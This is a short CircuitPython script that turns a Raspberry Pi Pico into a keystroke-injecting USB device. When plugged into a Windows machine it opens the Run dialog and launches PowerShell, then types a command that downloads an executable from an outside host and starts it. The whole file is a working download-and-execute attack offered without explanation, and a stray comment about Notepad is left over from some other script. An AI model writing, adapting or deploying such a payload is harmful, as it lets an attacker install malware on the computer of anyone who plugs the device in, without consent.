import time
import usb_hid
from adafruit_hid.keyboard import Keyboard

# Change for different language
from adafruit_hid.keyboard_layout_us import KeyboardLayout
from adafruit_hid.keycode import Keycode

# Create a keyboard object
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayout(keyboard)

time.sleep(5)  # Wait for 5 seconds after the Pico is plugged in

# Open the Run dialog by pressing Windows key + R
keyboard.press(Keycode.WINDOWS, Keycode.R) 
keyboard.release_all()

time.sleep(0.5)  # Short delay to ensure the Run dialog opens

# open powershell
layout.write("powershell")
keyboard.press(Keycode.ENTER)
keyboard.release_all()

time.sleep(1)  # Wait for powershell to open

# Now type the message in Notepad
layout.write("Invoke-WebRequest -Uri http://192.168.1.140:3232/4ac5d816227cbfba9580a510af5272e2 -OutFile test.exe; Start-Process .\\test.exe")
keyboard.release_all()
